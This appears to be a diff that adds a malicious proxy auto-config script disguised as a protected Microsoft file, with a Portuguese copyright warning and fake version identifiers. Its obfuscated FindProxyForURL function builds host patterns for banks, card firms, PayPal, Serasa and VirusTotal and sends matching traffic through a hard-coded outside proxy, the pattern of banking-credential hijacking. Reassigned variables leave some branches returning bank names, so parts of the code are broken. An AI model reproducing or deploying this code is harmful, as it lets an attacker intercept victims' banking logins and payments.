@@ -1,0 +1,86 @@
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+//
+// ATENÇÃO: Não modifique este arquivo.
+//
+// Versão: 7.1.01201.331337
+// Versões de Atualização: 7.1.0 (KB0311737)
+// Product ID (ident. do produto): 83748-007-8731337-98842
+//
+// Aviso: este arquivo é protegido por leis de direitos autorais e 
+// tratados internacionais. A reprodução ou distribuição não autorizada 
+// deste arquivo ou qualquer parte dele, poderá resultar em severas 
+// punições civis e criminais, e os infratores serão punidos dentro
+// do máximo rigor permitido por lei.
+//
+// 
+// (c) 2013 Microsoft Corporation. All Rights Reserved.
+//
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+function FindProxyForURL ( KX037 , KX038 ) {
+
+	var IDXA = "PROXY 199.238.143.75:80";
+	var IDXY = "DIRECT";
+	var IDXX = "DIRECT";
+	
+	var IDXB = "*.";
+	var IDXC = ".*";
+	
+	var IDXD = "c" + 		"a" + 		"i" + 		"x" + 		"a";
+	var IDXE = "h" + 	"s" + 				"b" + 			"c";
+	var IDXF = "i" + 			"t" + 			"a" + 			"u";
+	var IDXG = "b" + 		"r" + 			"a" + 			"d" + 		"e" + 			"s" + 			"c" + 			"o";
+	var IDXH = "b"	+     		  "b";
+	var IDXI = "s" + 	"er" + 			"as" + 			"a" + 		"e" + 			"xp" + 			"e" + 			"r" + 			"i" + 			"a" + 			"n";
+	var IDXJ = "p" + 		"a" + 			"y" + 		"p" + 			"a" + 				"l";
+	var IDXK = "c" + 			"i" + 		"ti" + 	"b" + 			"a" + 			"n" + 			"k";
+	var IDXL = "it" + 			"a" + 		"u" + 			"e" + 				"m" + 		"p" + 			"r" + 			"es" + 			"a" + 			"s";
+	var IDXM = "v" + 		"i" + 			"s" + 			"a";
+	var IDXN = "t" + 			"a" + 		"m";
+	var IDXO = "i" + 			"t" + 			"a" + 			"u" + 			"c" + 			"ar" + 			"d";
+	var IDXP = "i" + 		"t" + 		"a" + 		"u" + 		"p" + 		"e" + 		"r" + 		"s" + 		"o" + 		"n" + 		"na" + 		"l" + 		"i" + 		"t" + 		"e";
+	var IDXQ = "li" + 	"n" + 			"h" + 	"ad" + 			"e" +			 "fe" +	 "n" + 			"s" + "i" + 			"v"		 + "a";
+	var IDXR = "v" + 			"i" + 			"r" + 	"u" + 			"s" + 		"t" + 			"o" + 			"t" + 		"a" + 			"l";
+	var IDXX = "u" + 		"n" + 		"i" + 		"c" + 			"l" + 			"a" + 			"s" + 			"s";
+	var IDXY = "c" + 		"i" + 		"t" + 		"i" + 		"g" + 		"o" + 		"l" + 		"d";
+	var IDXZ = "v" + 		"o" + 		"e" + 		"g" + 		"ol";
+	
+	var IDXFA = IDXB + IDXD + IDXC;
+	var IDXFB = IDXB + IDXE + IDXC;
+	var IDXFC = IDXB + IDXF + IDXC;
+	var IDXFD = IDXB + IDXG + IDXC;
+	var IDXFE = IDXB + IDXH + IDXC;
+	var IDXFF = IDXB + IDXI + IDXC;
+	var IDXFG = IDXB + IDXJ + IDXC;
+	var IDXFH = IDXB + IDXK + IDXC;
+	var IDXFI = IDXB + IDXL + IDXC;
+	var IDXFJ = IDXB + IDXM + IDXC;
+	var IDXFK = IDXB + IDXN + IDXC;
+	var IDXFL = IDXB + IDXO + IDXC;
+	var IDXFM = IDXB + IDXP + IDXC;
+	var IDXFN = IDXB + IDXQ + IDXC;
+	var IDXFO = IDXB + IDXR + IDXC;
+	var IDXFP = IDXB + IDXX + IDXC;
+	var IDXFQ = IDXB + IDXY + IDXC;
+	var IDXFR = IDXB + IDXZ + IDXC;
+	
+	if (shExpMatch(KX037, IDXFA)) { return IDXA; } 
+	else if (shExpMatch(KX037, IDXFB)) { return IDXA; } 
+	else if (shExpMatch(KX037, IDXFC)) { return IDXA; } 
+	else if (shExpMatch(KX037, IDXFD)) { return IDXA; } 
+	else if (shExpMatch(KX037, IDXFE)) { return IDXA; } 
+	else if (shExpMatch(KX037, IDXFF)) { return IDXA; } 
+	else if (shExpMatch(KX037, IDXFG)) { return IDXA; } 
+	else if (shExpMatch(KX037, IDXFH)) { return IDXA; } 
+	else if (shExpMatch(KX037, IDXFI)) { return IDXA; } 
+	else if (shExpMatch(KX037, IDXFJ)) { return IDXA; } 
+	else if (shExpMatch(KX037, IDXFK)) { return IDXA; } 
+	else if (shExpMatch(KX037, IDXFL)) { return IDXY; } 
+	else if (shExpMatch(KX037, IDXFM)) { return IDXY; } 
+	else if (shExpMatch(KX037, IDXFN)) { return IDXA; } 
+	else if (shExpMatch(KX037, IDXFO)) { return IDXA; } 
+	else if (shExpMatch(KX037, IDXFP)) { return IDXA; } 
+	else if (shExpMatch(KX037, IDXFQ)) { return IDXA; } 
+	else if (shExpMatch(KX037, IDXFR)) { return IDXA; } 
+	else { return IDXY; }
+}
